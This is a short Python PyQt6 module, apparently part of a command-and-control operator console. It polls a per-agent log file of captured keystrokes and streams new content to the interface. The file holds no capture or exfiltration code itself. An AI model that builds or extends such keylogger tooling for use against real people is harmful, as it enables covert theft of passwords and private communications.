from pathlib import Path
from PyQt6.QtCore import QThread, pyqtSignal
from database import AgentRepository

class KeyLoggerOutputMonitor(QThread):
    """Monitor KeyLogger output from a specific agent"""
    output_received = pyqtSignal(str)
    
    def __init__(self, agent_id: str, agent_repository: AgentRepository, config):
        super().__init__()
        self.agent_id = agent_id
        self.agent_repository = agent_repository
        self.running = True
        self.output_file = Path(config.LOGS_FOLDER) / f"keylogger_output_{agent_id}.txt"
        self.last_content = None

    def run(self):
        import utils  # Import here to avoid circular imports
        while self.running:
            try:
                if self.output_file.exists():
                    with open(self.output_file, 'r', encoding='utf-8', errors='replace') as f:
                        content = f.read()
                        if content and content != self.last_content:
                            self.last_content = content
                            self.output_received.emit(content)
                                
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"Error reading output file: {e}")
            self.msleep(100)

    def stop(self):
        self.running = False